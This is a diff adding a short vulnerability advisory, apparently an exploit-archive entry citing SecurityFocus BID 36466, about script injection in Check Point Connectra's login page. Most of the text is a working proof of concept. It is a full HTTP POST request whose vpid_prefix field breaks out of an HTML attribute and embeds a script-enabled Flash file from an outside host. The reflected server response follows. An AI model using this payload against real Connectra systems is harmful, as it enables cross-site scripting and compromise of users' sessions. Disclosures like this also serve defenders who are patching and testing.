@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/36466/info
+
+Check Point Connectra is prone to an arbitrary-script-injection vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit this issue to execute arbitrary script code in the context of the webserver. Successful exploits can compromise the application. 
+
+--- CUT ---
+POST https://www.example.com:443/Login/Login HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2)
+Gecko/20090729 Firefox/3.5.2
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: https://www.example.com/Login/Login?LangCode=
+Cookie: CheckCookieSupport=1; ICSCookie=***purged***; user_locale=en_US
+Content-Type: application/x-www-form-urlencoded
+Content-length: 153
+
+loginType=Standard&userName=&vpid_prefix="><embed/src="http://www.example2.com/p/s/w/ccs.swf"
+allowScriptAccess=always><a name="
+&password=&HeightData=1147&Login=Sign+In
+
+--- CUT END ---
+
+Response Snippet:
+
+--- CUT ---
+<input type="hidden" id="vpid_prefix" name="vpid_prefix"
+value=""><embed/src="http://www.example2.com/p/s/w/ccs.swf"
+allowScriptAccess=always><a name="">
+--- CUT END ---
